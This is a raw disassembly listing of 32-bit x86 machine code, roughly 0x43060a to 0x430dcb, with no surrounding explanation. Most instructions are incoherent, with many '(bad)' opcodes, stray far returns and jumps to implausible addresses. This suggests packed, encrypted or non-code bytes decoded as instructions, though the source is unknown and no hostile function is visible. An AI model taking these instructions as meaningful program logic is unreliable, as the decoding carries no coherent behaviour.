  43060a:	add    BYTE PTR [ebp-0x75],al
  43060d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430614:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43061a:	(bad)  
  43061c:	retf   0x559c
  43061f:	(bad)  
  430620:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430627:	inc    ebp
  430628:	add    eax,0xeb9c4d3f
  43062d:	(bad)  
  43062e:	mov    ecx,eax
  430630:	lods   al,BYTE PTR ds:[esi]
  430631:	test   DWORD PTR [ebp-0x8],edx
  430634:	xor    ecx,DWORD PTR [ebp+0x33]
  430637:	mov    eax,DWORD PTR [ebx]
  430639:	lock add ecx,ebx
  43063c:	bswap  esi
  43063e:	retf   0x55d1
  430641:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430647:	jmp    0x430642
  430649:	add    BYTE PTR ds:0xebc44d8b,al
  43064f:	push   ebp
  430650:	mov    ebp,DWORD PTR [ebx]
  430652:	test   al,0x8b
  430654:	push   ebp
  430655:	clc    
  430656:	xor    ecx,ebx
  430658:	xor    ecx,esi
  43065a:	add    edx,ecx
  43065c:	add    eax,DWORD PTR [edx+0xca010f]
  430662:	push   ebp
  430663:	dec    ebp
  430664:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43066a:	stc    
  43066b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430671:	scas   eax,DWORD PTR es:[edi]
  430672:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430678:	xor    ebp,DWORD PTR [ebx]
  43067a:	xor    edi,DWORD PTR [ebx]
  43067c:	add    esi,DWORD PTR [edi+0x3]
  43067f:	mov    ecx,DWORD PTR [edi]
  430681:	clc    
  430682:	retf   0x55cb
  430685:	into   
  430686:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43068d:	mov    eax,0x3376554d
  430692:	mov    esi,DWORD PTR [ebx]
  430694:	enter  0x5503,0x3
  430698:	xor    ecx,DWORD PTR [edi]
  43069a:	xor    ecx,edx
  43069c:	add    edx,DWORD PTR [ebp+0x3]
  43069f:	mov    ecx,DWORD PTR [edi]
  4306a1:	lock retf 0x4dfa
  4306a5:	stc    
  4306a6:	mov    ecx,DWORD PTR [eax]
  4306a8:	or     BYTE PTR [ebp+0x4d],cl
  4306ab:	jmp    0x107073b
  4306b0:	dec    ebp
  4306b1:	dec    ebp
  4306b2:	(bad)  
  4306b3:	mov    esp,esp
  4306b5:	clc    
  4306b6:	test   ebx,ecx
  4306b8:	clc    
  4306b9:	ror    DWORD PTR [ebp-0x2a],cl
  4306bc:	mov    esi,ecx
  4306be:	in     al,dx
  4306bf:	scas   eax,DWORD PTR es:[edi]
  4306c0:	inc    ebp
  4306c1:	mov    esi,DWORD PTR [ebx]
  4306c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4306ca:	retf   
  4306cb:	ja     0x43069b
  4306cd:	mov    ebp,DWORD PTR [eax-0x48]
  4306d0:	dec    ebp
  4306d1:	xor    ecx,DWORD PTR [di+0x3]
  4306d5:	mov    ebp,eax
  4306d7:	clc    
  4306d8:	push   ebp
  4306d9:	retf   
  4306da:	mov    dl,bl
  4306dc:	adc    esi,edx
  4306de:	jb     0x4306ae
  4306e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4306e6:	in     al,dx
  4306e7:	jge    0x4306b4
  4306e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4306ec:	mov    esi,DWORD PTR [edi-0x24]
  4306ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4306f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4306fc:	mov    edx,ebx
  4306fe:	in     al,dx
  4306ff:	(bad)  
  430700:	ror    esi,cl
  430702:	push   ebp
  430703:	scas   eax,DWORD PTR es:[edi]
  430704:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43070a:	fwait
  43070b:	sub    esi,DWORD PTR [edx]
  43070d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430713:	lods   al,BYTE PTR ds:[esi]
  430714:	xor    esp,DWORD PTR [ebx]
  430716:	add    ecx,DWORD PTR [ebp-0x18]
  430719:	mov    edi,DWORD PTR [ebp-0x8]
  43071c:	mov    bl,cl
  43071e:	cmp    dl,bl
  430720:	jb     0x4306f0
  430722:	add    dh,dl
  430724:	dec    ebp
  430725:	scas   eax,DWORD PTR es:[edi]
  430726:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43072c:	shr    DWORD PTR [ebx],cl
  43072e:	into   
  43072f:	cmp    edx,esi
  430731:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430737:	dec    ebp
  430738:	dec    ebp
  430739:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43073f:	retf   
  430740:	xor    edx,esi
  430742:	add    ecx,esi
  430744:	imul   ecx,edx
  430747:	mov    DWORD PTR [ebp+0x8],edx
  43074a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43074d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430753:	add    esi,DWORD PTR [ebx]
  430755:	mov    ah,0x3
  430757:	inc    ebp
  430758:	rdtsc  
  43075a:	xlat   BYTE PTR ds:[ebx]
  43075b:	pushf  
  43075c:	jge    0x4306e7
  43075e:	xor    ebx,esp
  430760:	sub    eax,DWORD PTR [ebp-0x73]
  430763:	(bad)  
  430764:	cmp    al,al
  430766:	jb     0x4306ed
  430768:	add    al,bh
  43076a:	ror    DWORD PTR [ebp-0x7a],1
  43076d:	xor    edi,edi
  43076f:	add    edi,edi
  430771:	jmp    0x4307c0
  430773:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430779:	dec    ebp
  43077a:	into   
  43077b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430781:	fwait
  430782:	shl    DWORD PTR [edx],cl
  430784:	retf   0x5588
  430787:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43078d:	add    eax,DWORD PTR [eax]
  43078f:	call   0x8ace5ce1
  430794:	fcom   DWORD PTR [ecx]
  430796:	retf   
  430797:	jb     0x4307fe
  430799:	add    ch,cl
  43079b:	dec    ebp
  43079c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4307a2:	dec    ebp
  4307a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4307a9:	jge    0x430779
  4307ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4307b1:	add    cl,dh
  4307b3:	dec    ebp
  4307b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4307ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4307be:	add    ah,bl
  4307c0:	jge    0x43074e
  4307c2:	push   0xffffff9b
  4307c4:	push   0x8b3032
  4307c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4307cd:	xor    edi,edi
  4307cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4307d2:	inc    ebp
  4307d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4307d9:	dec    ebp
  4307da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4307e0:	jbe    0x43076d
  4307e2:	mov    esp,eax
  4307e4:	ror    bl,1
  4307e6:	enter  0x14ce,0xaf
  4307ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4307f0:	push   ebp
  4307f1:	retf   0x5540
  4307f4:	push   ebp
  4307f5:	mov    esi,DWORD PTR [edx-0x18]
  4307f8:	mov    edx,ebx
  4307fa:	cld    
  4307fb:	(bad)  
  4307fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430803:	sti    
  430804:	add    dh,cl
  430806:	push   0xffffff94
  430808:	call   FWORD PTR [ebx+0x3b5032d0]
  43080e:	mov    ecx,DWORD PTR [edi]
  430810:	enter  0x455e,0xff
  430814:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43081a:	xor    esi,DWORD PTR [ebx]
  43081c:	mov    DWORD PTR [ebx],0xcace0f9c
  430822:	aas    
  430823:	push   ebp
  430824:	inc    ebp
  430825:	xor    edx,esi
  430827:	add    edx,esi
  430829:	mov    eax,DWORD PTR [ebx]
  43082b:	(bad)  
  43082c:	jmp    0x4307ba
  43082e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430834:	rol    ah,1
  430836:	mov    esi,0xf133104d
  43083b:	mov    edx,0xff388d80
  430840:	mov    dh,0xd1
  430842:	cmp    edx,DWORD PTR [ebp+0xf]
  430845:	mov    eax,DWORD PTR [edx-0x28]
  430848:	add    BYTE PTR [ebp-0x75],bh
  43084b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430852:	fwait
  430853:	retf   0x8632
  430856:	cmp    ebp,0x8
  430859:	call   ebx
  43085b:	inc    ebp
  43085c:	inc    ebp
  43085d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430863:	mov    esi,DWORD PTR [ecx]
  430865:	int3   
  430866:	pushf  
  430867:	add    al,0xc7
  430869:	add    al,al
  43086b:	add    bl,al
  43086d:	(bad)  
  43086e:	clc    
  43086f:	int3   
  430870:	inc    ebp
  430871:	add    BYTE PTR [ecx],dh
  430873:	push   eax
  430874:	pushf  
  430875:	mov    edi,eax
  430877:	enter  0xc008,0x85
  43087b:	aas    
  43087c:	clc    
  43087d:	gs inc ebp
  43087f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430885:	push   ss
  430886:	xor    ecx,DWORD PTR [ebp+0x3]
  430889:	sub    edx,DWORD PTR [ecx-0x76]
  43088c:	dec    ebp
  43088d:	add    DWORD PTR [ebx+0x88d845],ecx
  430893:	mov    esi,DWORD PTR [ebx]
  430895:	or     BYTE PTR [ebx],al
  430897:	cmp    edx,DWORD PTR [ecx-0x34]
  43089a:	dec    ebp
  43089b:	out    dx,eax
  43089c:	xor    eax,DWORD PTR [ebp+0x3]
  43089f:	mov    edx,DWORD PTR [ecx-0x28]
  4308a2:	dec    ebp
  4308a3:	add    BYTE PTR [ebx],dh
  4308a5:	push   0x518003
  4308aa:	push   eax
  4308ab:	add    BYTE PTR [ebx-0x300748b],cl
  4308b1:	sbb    BYTE PTR [ebp+0x45],cl
  4308b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4308ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4308c0:	dec    ebp
  4308c1:	inc    ebp
  4308c2:	xor    edx,esi
  4308c4:	add    edx,esi
  4308c6:	push   ecx
  4308c7:	(bad)  
  4308c8:	dec    ebp
  4308c9:	mov    al,ds:0xc5d83dff
  4308ce:	retf   
  4308cf:	(bad)  
  4308d0:	into   
  4308d1:	sub    bh,bh
  4308d3:	dec    esp
  4308d4:	adc    al,0x9c
  4308d6:	inc    ebp
  4308d7:	push   ebp
  4308d8:	test   DWORD PTR [edi],ecx
  4308da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4308e1:	jmp    0xc9bc17f5
  4308e6:	add    cl,dl
  4308e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4308f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4308f8:	rol    BYTE PTR [eax],0x54
  4308fb:	clc    
  4308fc:	gs jb  0x430906
  4308ff:	mov    eax,DWORD PTR [ebp-0x30]
  430902:	xor    al,0x40
  430904:	sub    al,0xc7
  430906:	mov    al,ah
  430908:	add    DWORD PTR [ebp+0x4534f845],eax
  43090e:	sub    al,0x80
  430910:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430917:	mov    ch,0xff
  430919:	clc    
  43091a:	add    DWORD PTR [ebp+0x60],0x3d
  43091e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430925:	inc    ebp
  430926:	dec    DWORD PTR [ebx-0x3427f701]
  43092c:	test   esi,ecx
  43092e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430934:	push   eax
  430935:	add    DWORD PTR [ebp+0x0],eax
  430938:	dec    ebx
  43093a:	or     al,0xce
  43093c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430943:	into   
  430944:	add    BYTE PTR [ebx-0x34ff2000],cl
  43094a:	mov    esi,ecx
  43094c:	sar    bh,0x45
  43094f:	adc    al,0x8b
  430951:	clc    
  430952:	fadd   DWORD PTR [ebp+0x0]
  430955:	mov    ebp,DWORD PTR [edx+0x8]
  430958:	push   edi
  430959:	adc    BYTE PTR [eax+0x1],0x83
  43095d:	add    al,al
  43095f:	retf   
  430960:	mov    ecx,esi
  430962:	cld    
  430963:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430969:	into   
  43096a:	add    BYTE PTR [ebx+0x756ae000],cl
  430970:	jne    0x4309a5
  430972:	inc    DWORD PTR [ebx]
  430974:	rcl    BYTE PTR [ecx+0x50],1
  430977:	push   eax
  430978:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43097e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430985:	sar    bh,0x84
  430988:	or     BYTE PTR [ebx],al
  43098a:	push   eax
  43098b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430991:	pushf  
  430992:	xor    edi,eax
  430994:	pushf  
  430995:	mov    ah,0x89
  430997:	test   esp,ebp
  430999:	clc    
  43099a:	inc    ebp
  43099b:	inc    ebp
  43099c:	mov    DWORD PTR [eax+eax*8],esi
  43099f:	sub    al,0x32
  4309a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4309a8:	dec    ebp
  4309a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4309b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4309be:	shl    DWORD PTR [ebp-0x380064],1
  4309c4:	enter  0x858d,0x60
  4309c8:	clc    
  4309c9:	inc    DWORD PTR [ebp+0x50]
  4309cc:	cmp    al,0x75
  4309ce:	pushf  
  4309cf:	(bad)  
  4309d0:	(bad)  
  4309d1:	pop    esp
  4309d2:	lods   al,BYTE PTR ds:[esi]
  4309d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4309d9:	mov    edi,DWORD PTR [esi]
  4309db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4309e2:	test   DWORD PTR [edi-0x8],edx
  4309e5:	sbb    al,0x45
  4309e7:	add    BYTE PTR [eax],bh
  4309e9:	push   0x8b809c
  4309ee:	loopne 0x430a35
  4309f0:	push   ebp
  4309f1:	mov    esi,DWORD PTR [ebx]
  4309f3:	cld    
  4309f4:	add    eax,DWORD PTR [eax+0xf013b]
  4309fa:	adc    al,0x0
  4309fc:	add    bh,bh
  4309fe:	jmp    0xc00b1b
  430a03:	add    BYTE PTR [ebp+0x45],cl
  430a06:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a0c:	dec    ebp
  430a0d:	push   0x38033
  430a12:	cmp    eax,DWORD PTR [eax]
  430a14:	unpcklps xmm7,xmm0
  430a17:	jne    0x430a19
  430a19:	dec    DWORD PTR [ebx+0x5545c818]
  430a1f:	mov    DWORD PTR [ebx],esi
  430a21:	shl    BYTE PTR [ebx],1
  430a23:	inc    ebp
  430a24:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430a2a:	retf   0x5575
  430a2d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430a33:	(bad)  
  430a34:	stc    
  430a35:	loopne 0x430a43
  430a37:	test   DWORD PTR [ebp-0x8],ecx
  430a3a:	xor    eax,DWORD PTR [ebp+0x3]
  430a3d:	mov    ebp,ecx
  430a3f:	rol    BYTE PTR [eax],1
  430a41:	inc    ebp
  430a42:	add    BYTE PTR [eax-0x7747ab3],bh
  430a48:	clc    
  430a49:	inc    ebp
  430a4a:	retf   
  430a4b:	mov    edx,ebx
  430a4d:	loopne 0x430a25
  430a4f:	retf   
  430a50:	into   
  430a51:	into   
  430a52:	scas   eax,DWORD PTR es:[edi]
  430a53:	dec    ebp
  430a54:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430a5a:	sub    ecx,esi
  430a5c:	cmp    ecx,DWORD PTR [ebp+0x77]
  430a5f:	(bad)  
  430a60:	mov    edi,eax
  430a62:	enter  0x8985,0xf8
  430a66:	add    BYTE PTR [ebp-0x75],al
  430a69:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430a70:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430a76:	(bad)  
  430a78:	retf   0x559c
  430a7b:	(bad)  
  430a7c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a83:	inc    ebp
  430a84:	add    eax,0xeb9c4d3f
  430a89:	(bad)  
  430a8a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a90:	xor    ecx,DWORD PTR [ebp+0x33]
  430a93:	mov    eax,DWORD PTR [ebx]
  430a95:	in     al,dx
  430a96:	add    ecx,ebx
  430a98:	bswap  esi
  430a9a:	retf   0x55d1
  430a9d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430aa3:	jmp    0x430a9e
  430aa5:	add    BYTE PTR ds:0xebf44d8b,al
  430aab:	push   ebp
  430aac:	mov    ebp,DWORD PTR [ebx]
  430aae:	mov    eax,0x33f8558b
  430ab3:	retf   
  430ab4:	xor    ecx,esi
  430ab6:	add    edx,ecx
  430ab8:	add    eax,DWORD PTR [edx+0xca010f]
  430abe:	push   ebp
  430abf:	dec    ebp
  430ac0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430ac6:	stc    
  430ac7:	rol    DWORD PTR ds:0xebce4dd6,cl
  430acd:	scas   eax,DWORD PTR es:[edi]
  430ace:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430ad4:	xor    ebp,DWORD PTR [ebx]
  430ad6:	xor    edi,DWORD PTR [ebx]
  430ad8:	add    esi,DWORD PTR [edi+0x3]
  430adb:	mov    ecx,DWORD PTR [edi]
  430add:	clc    
  430ade:	retf   0x55cb
  430ae1:	into   
  430ae2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430ae9:	test   al,0x4d
  430aeb:	push   ebp
  430aec:	jbe    0x430b21
  430aee:	mov    esi,DWORD PTR [ebx]
  430af0:	mov    al,0x3
  430af2:	push   ebp
  430af3:	add    esi,DWORD PTR [ebx]
  430af5:	rdpmc  
  430af7:	retf   0x5503
  430afa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b00:	dec    ebp
  430b01:	stc    
  430b02:	mov    ecx,DWORD PTR [eax]
  430b04:	or     BYTE PTR [ebp+0x4d],cl
  430b07:	jmp    0x1370b97
  430b0c:	dec    ebp
  430b0d:	dec    ebp
  430b0e:	(bad)  
  430b0f:	mov    esp,esp
  430b11:	clc    
  430b12:	test   ebx,ecx
  430b14:	clc    
  430b15:	ror    DWORD PTR [ebp-0x2a],cl
  430b18:	mov    esi,ecx
  430b1a:	lock scas eax,DWORD PTR es:[edi]
  430b1c:	inc    ebp
  430b1d:	mov    esi,DWORD PTR [ebx]
  430b1f:	hlt    
  430b20:	pushf  
  430b21:	jge    0x430aae
  430b23:	sub    esp,esp
  430b25:	cmp    ecx,ebx
  430b27:	ja     0x430af7
  430b29:	mov    ebp,DWORD PTR [eax-0x58]
  430b2c:	dec    ebp
  430b2d:	xor    ecx,DWORD PTR [di+0x3]
  430b31:	mov    ebp,eax
  430b33:	clc    
  430b34:	push   ebp
  430b35:	retf   
  430b36:	mov    dl,bl
  430b38:	adc    esi,edx
  430b3a:	jb     0x430b0a
  430b3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430b42:	lock jge 0x430b10
  430b45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430b48:	mov    esi,DWORD PTR [edi-0x28]
  430b4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430b52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430b58:	mov    edx,ebx
  430b5a:	lock (bad) 
  430b5c:	ror    esi,cl
  430b5e:	push   ebp
  430b5f:	scas   eax,DWORD PTR es:[edi]
  430b60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430b66:	fwait
  430b67:	sub    esi,DWORD PTR [edx]
  430b69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b70:	xor    esp,DWORD PTR [ebx]
  430b72:	add    ecx,DWORD PTR [ebp-0x18]
  430b75:	mov    edi,DWORD PTR [ebp-0x8]
  430b78:	mov    bl,cl
  430b7a:	cmp    dl,bl
  430b7c:	jb     0x430b4c
  430b7e:	add    dh,dl
  430b80:	dec    ebp
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b88:	shr    DWORD PTR [ebx],cl
  430b8a:	into   
  430b8b:	cmp    edx,esi
  430b8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b93:	dec    ebp
  430b94:	dec    ebp
  430b95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b9b:	retf   
  430b9c:	xor    edx,esi
  430b9e:	add    ecx,esi
  430ba0:	imul   ecx,edx
  430ba3:	mov    DWORD PTR [ebp+0x8],edx
  430ba6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430ba9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430baf:	add    esi,DWORD PTR [ebx]
  430bb1:	rol    BYTE PTR [ebx],0x45
  430bb4:	rdtsc  
  430bb6:	xlat   BYTE PTR ds:[ebx]
  430bb7:	pushf  
  430bb8:	jge    0x430b43
  430bba:	xor    ebx,eax
  430bbc:	sub    eax,DWORD PTR [ebp-0x73]
  430bbf:	(bad)  
  430bc0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430bc7:	dec    ebp
  430bc8:	xchg   BYTE PTR [ebx],dh
  430bca:	inc    DWORD PTR [ebx]
  430bcc:	(bad)  
  430bcd:	jmp    0x430c1c
  430bcf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430bd5:	dec    ebp
  430bd6:	into   
  430bd7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430bdd:	fwait
  430bde:	shl    DWORD PTR [edx],cl
  430be0:	retf   0x5588
  430be3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430be9:	add    eax,DWORD PTR [eax]
  430beb:	call   0x8ace613d
  430bf0:	fcom   QWORD PTR [ecx]
  430bf2:	retf   
  430bf3:	jb     0x430c5a
  430bf5:	add    ch,cl
  430bf7:	dec    ebp
  430bf8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430bfe:	dec    ebp
  430bff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c05:	jge    0x430bd5
  430c07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c0d:	add    cl,dh
  430c0f:	dec    ebp
  430c10:	dec    DWORD PTR [ebx-0x2c031b01]
  430c16:	inc    ebp
  430c17:	push   ebp
  430c18:	dec    DWORD PTR [ebx-0x73ff2734]
  430c1e:	lea    ebx,[ebx-0x7400cdac]
  430c24:	push   eax
  430c25:	mov    ah,0x45
  430c27:	push   ebp
  430c28:	mov    esi,DWORD PTR [ebx]
  430c2a:	les    esi,FWORD PTR [ebx]
  430c2c:	add    BYTE PTR [ebx],al
  430c2e:	inc    DWORD PTR [ebx]
  430c30:	mov    ecx,DWORD PTR [edi]
  430c32:	cld    
  430c33:	retf   0x4d80
  430c36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430c3c:	jne    0x430bc9
  430c3e:	jmp    eax
  430c40:	ror    bl,1
  430c42:	or     cl,dh
  430c44:	add    BYTE PTR [edi-0xf2f7475],ch
  430c4a:	not    bl
  430c4c:	adc    al,0xca
  430c4e:	inc    ebp
  430c4f:	push   ebp
  430c50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430c56:	push   0xaf80d6
  430c5b:	mov    eax,DWORD PTR [eax]
  430c5d:	in     al,0xff
  430c5f:	sti    
  430c60:	sbb    dh,cl
  430c62:	pop    esi
  430c63:	xchg   esp,eax
  430c64:	leave  
  430c65:	fwait
  430c66:	add    al,0x32
  430c68:	push   ebp
  430c69:	cmp    ebp,esp
  430c6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430c6f:	dec    DWORD PTR [ecx-0x740f0375]
  430c75:	push   ebp
  430c76:	cld    
  430c77:	xor    ebp,ebx
  430c79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430c7f:	push   ebp
  430c80:	clc    
  430c81:	xor    esi,ecx
  430c83:	add    esi,DWORD PTR [ebp-0x75]
  430c86:	(bad)  
  430c87:	hlt    
  430c88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c8f:	mov    DWORD PTR [esi],eax
  430c91:	hlt    
  430c92:	(bad)  
  430c93:	dec    ebp
  430c94:	add    esi,DWORD PTR [ebx]
  430c96:	(bad)  
  430c97:	mov    edx,0xffc68d0a
  430c9c:	add    dl,cl
  430c9e:	leave  
  430c9f:	push   ebp
  430ca0:	push   ebp
  430ca1:	mov    ebp,esp
  430ca3:	fcom   QWORD PTR [ecx+0x7d]
  430ca6:	inc    ebp
  430ca7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430cad:	iret   
  430cae:	cld    
  430caf:	retf   0x868f
  430cb2:	loopne 0x430cb1
  430cb4:	mov    edi,edi
  430cb6:	mov    esi,DWORD PTR [ebp-0x8]
  430cb9:	mov    esi,eax
  430cbb:	cld    
  430cbc:	jne    0x430c6e
  430cbe:	mov    BYTE PTR [ecx],0xa
  430cc1:	add    dh,al
  430cc3:	test   DWORD PTR [eax],ecx
  430cc5:	inc    esi
  430cc7:	inc    DWORD PTR [edi]
  430cc9:	mov    eax,esi
  430ccb:	cld    
  430ccc:	add    DWORD PTR [eax+0x901c6],eax
  430cd2:	leave  
  430cd3:	xor    BYTE PTR [ebp+0x45],dl
  430cd6:	in     al,dx
  430cd7:	mov    edx,DWORD PTR [ecx-0x40]
  430cda:	inc    ebp
  430cdb:	add    BYTE PTR [ecx-0x74000301],cl
  430ce1:	int3   
  430ce2:	cld    
  430ce3:	jne    0x430c9d
  430ce5:	call   0xcc1ff0
  430cea:	mov    esi,DWORD PTR [ebp-0x8]
  430ced:	test   eax,esi
  430cef:	je     0x430d66
  430cf1:	mov    eax,esi
  430cf3:	cld    
  430cf4:	add    al,0x80
  430cf6:	add    WORD PTR [ecx+0x0],ax
  430cfa:	fiadd  DWORD PTR [eax]
  430cfc:	mov    BYTE PTR [eax],0x3d
  430cff:	push   0xffffffc3
  430d01:	push   esi
  430d02:	mov    edx,DWORD PTR [eax+0x51]
  430d05:	pop    edi
  430d06:	lea    ebx,[ebx-0x8]
  430d09:	ret    0x45
  430d0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d12:	xchg   eax,edi
  430d14:	mov    DWORD PTR [ebp-0x75],ecx
  430d17:	push   esi
  430d18:	clc    
  430d19:	jne    0x430ceb
  430d1b:	mov    ecx,0xf8450b0b
  430d20:	(bad)  
  430d21:	push   cs
  430d22:	or     BYTE PTR [ebp-0x3a],dh
  430d25:	cmp    eax,DWORD PTR [ecx]
  430d27:	pop    esi
  430d28:	(bad)  
  430d29:	or     al,0x5
  430d2b:	inc    eax
  430d2c:	leave  
  430d2d:	jmp    0x40cf:0x25564204
  430d34:	leave  
  430d35:	in     eax,dx
  430d36:	inc    DWORD PTR [eax-0x75]
  430d39:	fimul  DWORD PTR [ebx-0x228139be]
  430d3f:	inc    eax
  430d40:	nop
  430d41:	loopne 0x430d42
  430d43:	ret    
  430d44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d4a:	add    eax,0xff45e8f8
  430d4f:	push   esi
  430d50:	push   DWORD PTR [ebp-0x39]
  430d53:	mov    eax,0x7edda46
  430d58:	or     al,0x6
  430d5a:	push   DWORD PTR [ebp-0x3a]
  430d5d:	cmp    eax,DWORD PTR [edx]
  430d5f:	pop    esi
  430d60:	ret    
  430d61:	or     al,0x56
  430d63:	inc    ecx
  430d64:	push   ebp
  430d65:	jle    0x430d53
  430d67:	inc    edx
  430d68:	inc    ebp
  430d69:	int    0x1
  430d6b:	inc    ecx
  430d6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430d72:	add    DWORD PTR [edx+0x1c],eax
  430d75:	retf   0xc38b
  430d78:	adc    al,0x8b
  430d7a:	xchg   edx,eax
  430d7b:	push   ecx
  430d7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d82:	rcl    DWORD PTR [esi-0x9],cl
  430d85:	jne    0x430dd7
  430d87:	mov    eax,0x7c80ece
  430d8c:	rol    DWORD PTR [esi],cl
  430d8e:	div    DWORD PTR [ebp+0x50]
  430d91:	cmp    ecx,edx
  430d93:	pop    esi
  430d94:	dec    BYTE PTR [edx]
  430d96:	in     al,dx
  430d97:	inc    edx
  430d98:	sub    esp,ecx
  430d9a:	inc    eax
  430d9b:	(bad)  
  430d9c:	push   eax
  430d9d:	add    edx,DWORD PTR [eax-0x1f]
  430da0:	push   edi
  430da1:	add    dh,dh
  430da3:	leave  
  430da4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430da8:	add    BYTE PTR [ecx+0x0],dl
  430dab:	inc    ebp
  430dac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430db2:	add    BYTE PTR [eax-0x7fbf448],bh
  430db8:	add    al,0x2
  430dba:	jmp    0x57eb914
  430dbf:	jne    0x430da9
  430dc1:	mov    eax,DWORD PTR [edx]
  430dc3:	or     BYTE PTR [eax],al
  430dc5:	inc    ecx
  430dc6:	stc    
  430dc7:	in     eax,dx
  430dc8:	ss inc eax
  430dca:	aas    
  430dcb:	out    0x7d,eax
